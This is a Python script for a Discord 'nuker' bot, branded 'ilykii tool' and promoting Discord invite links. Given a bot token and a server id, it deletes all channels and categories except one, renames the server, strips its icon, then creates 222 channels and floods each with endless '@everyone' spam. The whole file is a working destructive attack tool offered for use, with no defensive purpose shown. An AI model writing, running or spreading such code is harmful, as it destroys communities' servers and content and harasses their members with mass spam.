import discord
from discord.ext import commands
from colorama import init, Fore
import asyncio
import time

print(Fore.LIGHTBLUE_EX +  "https://dsc.gg/kanimcz or https://discord.gg/2jtHtAepVR")
print(Fore.LIGHTMAGENTA_EX + '''

                  ___       ___           ___                             
      ___        /\__\     |\__\         /\__\          ___         ___   
     /\  \      /:/  /     |:|  |       /:/  /         /\  \       /\  \  
     \:\  \    /:/  /      |:|  |      /:/__/          \:\  \      \:\  \ 
     /::\__\  /:/  /       |:|__|__   /::\__\____      /::\__\     /::\__)
  __/:/\/__/ /:/__/        /::::\__\ /:/\:::::\__\  __/:/\/__/  __/:/\/__/
 /\/:/  /    \:\  \       /:/~~/~    \/_|:|~~|~    /\/:/  /    /\/:/  /   
 \::/__/      \:\  \     /:/  /         |:|  |     \::/__/     \::/__/    
  \:\__\       \:\  \    \/__/          |:|  |      \:\__\      \:\__\    
   \/__/        \:\__\                  |:|  |       \/__/       \/__/    
                 \/__/                   \|__|                            ''')

intents = discord.Intents.all()
bot = discord.Client(intents=intents)
token = input(Fore.MAGENTA + "discord bot token: ")
guild_id = input("server id: ")
spam_message = input("spam message: ")
new_channels_name = input("new channels name: ")
async def send_message_periodically(channel):
    while True:
        await channel.send("@everyone nuked by https://discord.gg/2jtHtAepVR or https://dsc.gg/kanimcz " + spam_message)
        await asyncio.sleep(0)
        print(Fore.GREEN + "spammed:", channel.name)

@bot.event
async def on_ready():
    print(f"ilykii is ready as {bot.user}")

    
    guild = bot.get_guild(int(guild_id))

    if guild is None:
        print("server id error")
        return
    
    if guild:
        ignore_channel_name = "NXWY SMRDI"

        
        categories = [category for category in guild.categories if category.name != ignore_channel_name]
        text_channels = [channel for channel in guild.text_channels if channel.name != ignore_channel_name]
        voice_channels = [channel for channel in guild.voice_channels if channel.name != ignore_channel_name]

    for channel in text_channels:
        try:
            await channel.delete()
            await asyncio.sleep(0)
            print("deleted:", channel.name)
        except:
            pass
    for channel in voice_channels:
        try:
            await channel.delete()
            await asyncio.sleep(0)
            print("deleted:", channel.name)
        except:
            pass
    for category in categories:
        try:
            await category.delete()
            await asyncio.sleep(0)
            print("deleted", category.name)
        except:
            pass
    try:
        
        await guild.edit(name="nuked by ilykii tool")
        await print("server name changed")
    except:
        print("name edit error")
    try:
         
        await guild.edit(icon=None)
        await print("server pfp changed")
    except:
        print("pfp edit error")

    channels = []
    for i in range(222):
        channel_name = new_channels_name
        channel = await guild.create_text_channel(channel_name)
        channels.append(channel)
        await asyncio.sleep(0)
        print("created:", channel.name)
        
        bot.loop.create_task(send_message_periodically(channel))

bot.run(token)